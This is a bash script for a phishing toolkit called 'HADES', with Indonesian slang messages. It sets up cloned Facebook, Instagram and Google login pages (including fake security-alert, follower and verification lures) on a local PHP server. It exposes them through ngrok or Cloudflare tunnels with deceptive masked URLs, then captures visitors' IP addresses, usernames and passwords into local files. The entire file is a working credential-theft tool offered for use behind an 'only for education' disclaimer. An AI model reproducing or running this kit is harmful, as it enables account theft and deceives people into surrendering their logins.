#!/bin/bash

## warna (FG & BG)
MERAH="$(printf '\033[31m')"  IJO="$(printf '\033[32m')"  OREN="$(printf '\033[33m')"  BIRU="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  PUTIH="$(printf '\033[37m')" ITEM="$(printf '\033[30m')"
MERAHBG="$(printf '\033[41m')"  IJOBG="$(printf '\033[42m')"  ORENBG="$(printf '\033[43m')"  BIRUBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  PUTIHBG="$(printf '\033[47m')" ITEMBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## direktori
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${CYAN}[${PUTIH}!${CYAN}]${CYAN} Di berhentiin paksa kek restu orang tua :v." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${CYAN}[${PUTIH}!${CYAN}]${CYAN} Diberhentikan cok." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## reset warna teminal
reset_color() {
	tput sgr0
	tput op
    return
}

## kill proses yg lgi jalan
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF
		${CYAN}
		${CYAN}                101011       100110
		${CYAN}                101100       011100
		${CYAN}                000010       101101
		${CYAN}                000101       110010
		${CYAN}                0000010110100101011
		${CYAN}                1010001${PUTIH}HADES${CYAN}1001100      
		${CYAN}                0000100010011000010
		${CYAN}                010100       111001                          
		${CYAN}                100000       011000
		${CYAN}                010010       101010
		${CYAN}                001000       110001
		${CYAN}                             ${MERAH}Version : 1.0
		
		${IJO}[${PUTIH}-${IJO}]${CYAN} Buatan wong ganteng (${PUTIH}Hades${CYAN})${PUTIH}
	EOF
}

## Small Banner
banner_small() {
	cat <<- EOF
		${BIRU}
		${BIRU}  ░█░█░█▀█░█▀▄░█▀▀░█▀▀      
		${BIRU}  ░█▀█░█▀█░█░█░█▀▀░▀▀█   
		${BIRU}  ░▀░▀░▀░▀░▀▀░░▀▀▀░▀▀▀${PUTIH} 1.0
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${IJO}[${PUTIH}+${IJO}]${CYAN} Install yang dibutuhkan..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${IJO}[${PUTIH}+${IJO}]${CYAN} Sedang menginstall paket dari JNE : ${OREN}proot${CYAN}"${PUTIH}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${IJO}[${PUTIH}+${IJO}]${IJO} Paket dah nyampe alias dah ke install."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${IJO}[${PUTIH}+${IJO}]${CYAN} Install paket lagi dari JNE : ${OREN}$pkg${CYAN}"${PUTIH}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Kagak mendukung paket JNE, ambil sendiri(install manual)."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Error cok, install manual sana."
		{ reset_color; exit 1; }
	fi
}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Error anying, install manual klodpler nya."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${IJO}[${PUTIH}+${IJO}]${IJO} Ngrok dah ada."
	else
		echo -e "\n${IJO}[${PUTIH}+${IJO}]${CYAN} Lagi install ngrok..."${PUTIH}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${IJO}[${PUTIH}+${IJO}]${IJO} klodpler dah ada."
	else
		echo -e "\n${IJO}[${PUTIH}+${IJO}]${CYAN} Lagi Install klodpler..."${PUTIH}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

## pesan keluar
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${IJOBG}${BLACK} Makasih udah gunain tool kecil ini :v moga dapet banyak y wkkwkw.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${IJO}Author   ${MERAH}:  ${OREN}BADUT CINTA  ${MERAH}[ ${OREN}HADES ${MERAH}]
		${IJO}Version  ${MERAH}:  ${OREN}1


		${MERAH}Warning:${PUTIH}
		${MERAHBG}
		${PUTIH}HANYA UNTUK EDUKASI, KALO BUAT SENENG SENENG GPP :v ${MERAH}!${PUTIH}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${MERAH}!${PUTIH}

		${MERAH}[${PUTIH}00${MERAH}]${OREN} Main Menu     ${MERAH}[${PUTIH}99${MERAH}]${OREN} Exit

	EOF

	read -p "${MERAH}[${PUTIH}-${MERAH}]${IJO} Select an option : ${BIRU}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${IJO}[${PUTIH}+${IJO}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} Setting up server..."${PUTIH}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} Memulai PHP server..."${PUTIH}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} IP pengunjung : ${BIRU}$IP"
	echo -ne "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} Dah disave : ${OREN}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Data
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Akun : ${BIRU}$ACCOUNT"
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Password : ${BIRU}$PASSWORD"
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} Dah di save di : ${OREN}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${MERAH}[${PUTIH}-${MERAH}]${OREN} Tunggu login selanjutnya y, ${BIRU}Ctrl + C ${OREN} buat minggat. "
}

## Tampilin
capture_data() {
	echo -ne "\n${MERAH}[${PUTIH}-${MERAH}]${OREN} Tunggu login selanjutnya y, ${BIRU}Ctrl + C ${OREN}untuk miggat..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${MERAH}[${PUTIH}-${MERAH}]${IJO} IP pengunjung !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Ingfo login nih !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Initializing... ${IJO}( ${CYAN}http://$HOST:$PORT ${IJO})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Menjalankan Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} URL 1 : ${IJO}$ngrok_url"
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} URL 2 : ${IJO}$mask@$ngrok_url1"
	capture_data
}

## Start Cloudflared
start_cloudflared() { 
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Initializing... ${IJO}( ${CYAN}http://$HOST:$PORT ${IJO})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Menjalankan klodpler..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} URL 1 : ${IJO}$cldflr_link"
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${BIRU} URL 2 : ${IJO}$mask@$cldflr_link1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Initializing... ${IJO}( ${CYAN}http://$HOST:$PORT ${IJO})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${MERAH}[${PUTIH}-${MERAH}]${IJO} Sukses di host : ${IJO}${CYAN}http://$HOST:$PORT ${IJO}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${MERAH}[${PUTIH}01${MERAH}]${OREN} Localhost    ${MERAH}[${CYAN}Satu jaringan, g recommended${MERAH}]
		${MERAH}[${PUTIH}02${MERAH}]${OREN} Ngrok.io     ${MERAH}[${CYAN}Buggy${MERAH}]
		${MERAH}[${PUTIH}03${MERAH}]${OREN} Cloudflared  ${MERAH}[${CYAN} RECOMMENDED COK${MERAH}]

	EOF

	read -p "${MERAH}[${PUTIH}-${MERAH}]${IJO} Pilih : ${BIRU}"

	case $REPLY in 
		1 | 01)
			start_localhost;;
		2 | 02)
			start_ngrok;;
		3 | 03)
			start_cloudflared;;
		*)
			echo -ne "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Masukin apaan cok, yang bener..."
			{ sleep 1; tunnel_menu; };;
	esac
}

## Facebook
situs_facebook() {
	cat <<- EOF

		${MERAH}[${PUTIH}01${MERAH}]${OREN} Tampilan login biasa
		${MERAH}[${PUTIH}02${MERAH}]${OREN} Vote halaman terbaik
		${MERAH}[${PUTIH}03${MERAH}]${OREN} Halaman keamanan palsu
		${MERAH}[${PUTIH}04${MERAH}]${OREN} Halaman login messenger

	EOF

	read -p "${MERAH}[${PUTIH}-${MERAH}]${IJO} Pilih satu aja biar setia : ${BIRU}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='http://facebuk-verified'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='http://facebuk-vote-page'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='http://facebuk-security-alert'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='http://facebuk-mesengger'
			tunnel_menu;;
		*)
			echo -ne "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Maukin apa? yang bener Cok..."
			{ sleep 1; clear; banner_small; situs_facebook; };;
	esac
}

## Instagram
situs_instagram() {
	cat <<- EOF

		${MERAH}[${PUTIH}01${MERAH}]${OREN} Halaman login biasa
		${MERAH}[${PUTIH}02${MERAH}]${OREN} Halaman login auto followers
		${MERAH}[${PUTIH}03${MERAH}]${OREN} Halaman login nambah 1000 followers
		${MERAH}[${PUTIH}04${MERAH}]${OREN} Halaman login dapetin centang

	EOF

	read -p "${MERAH}[${PUTIH}-${MERAH}]${IJO} Pilih satu aja : ${BIRU}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='http://instagram-login'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='http://instagram-auto-followers'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='http://instagram-1000-followers'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='http://instagram-verify'
			tunnel_menu;;
		*)
			echo -ne "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} masukin apa co? yang bener..."
			{ sleep 1; clear; banner_small; situs_instagram; };;
	esac
}

## Gmail/Google
situs_gmail() {
	cat <<- EOF

		${MERAH}[${PUTIH}01${MERAH}]${OREN} Halaman login versi lama google
		${MERAH}[${PUTIH}02${MERAH}]${OREN} Halaman login versi baru
		${MERAH}[${PUTIH}03${MERAH}]${OREN} Voting halaman

	EOF

	read -p "${MERAH}[${PUTIH}-${MERAH}]${IJO} pilih satu aja : ${BIRU}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='http://goog-le-drive'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='http://goog-le-drive'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='http://goog-le-vote'
			tunnel_menu;;
		*)
			echo -ne "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Masukin apa? yang bener cok..."
			{ sleep 1; clear; banner_small; situs_gmail; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${MERAH}[${CYAN}::${MERAH}]${OREN} Pilih nih bosqueee ${MERAH}[${PUTIH}::${MERAH}]${OREN}

		${MERAH}[${CYAN}01${MERAH}]${PUTIH} Facebook
		${MERAH}[${CYAN}02${MERAH}]${PUTIH} Instagram
		${MERAH}[${CYAN}03${MERAH}]${PUTIH} Google

		${MERAH}[${CYAN}99${MERAH}]${PUTIH} About
		${MERAH}[${CYAN}00${MERAH}]${PUTIH} Exit

	EOF
	
	read -p "${MERAH}[${PUTIH}-${MERAH}]${IJO} Pilih satu aja jangan banyak-banyak : ${BIRU}"

	case $REPLY in 
		1 | 01)
			situs_facebook;;
		2 | 02)
			situs_instagram;;
		3 | 03)
			situs_gmail;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${MERAH}[${PUTIH}!${MERAH}]${MERAH} Maukin apa? yang bener..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
main_menu
